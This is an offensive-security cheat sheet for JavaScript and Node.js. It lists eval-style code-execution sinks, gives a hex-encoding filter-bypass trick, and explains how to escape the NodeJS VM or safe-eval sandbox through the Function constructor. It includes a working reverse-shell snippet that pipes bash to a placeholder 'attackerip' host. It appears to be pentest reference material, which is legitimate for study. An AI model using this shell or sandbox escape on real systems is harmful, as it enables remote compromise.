# JavaScript

### Notes
- JavaScript strings can be natively hex-encoded e.g. `"\\\\x2fbin\\\\x2fbash"` - useful for string/regex bypass

### Dangerous Functions

```js
/* RCE */
eval()                  //evaluate string as a javascript code
safe-eval()             //same as eval, but more secure however sandbox escape exists (NSP 337, CVE-2017-16088)
setTimeout(string, 2)
setInterval(string)
Function(string)

/* Command Execution */
child_process.exec()

/* LFI */
require()
```

### Reverse Shell

```js
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```

### Escaping NodeJS VM (sandbox)

- Escaping NodeJS VM or `safe-eval` is possible, see - and [escape.js](/vulnerable-code-examples/js/escape.js) for PoC

**Summary**

- Just about everything in JavaScript has a constructor which can be accessed (any primitive data type/object).
- Even the constructor has a constructor, and that constructor is the constructor of functions.
- If you call the `function constructor` with a string argument, it basically does an `eval` and makes a function whose body is that string. (wtf)
- The provided context in the `safe-eval` makes this more difficult to work with, however unless the context is limited to ONLY primitive types, we can likely still break out of the sandbox by accessing the constructor of a non-primitive object in the context.
- We can then use for `require` to get other dependencies (`child_process`), to execute `exec` to get a reverse shell.

Other useful resources for understanging the JavaScript sandbox workings:
- https://www.wispwisp.com/index.php/2019/08/16/cve-2017-16088-poc/
- https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/
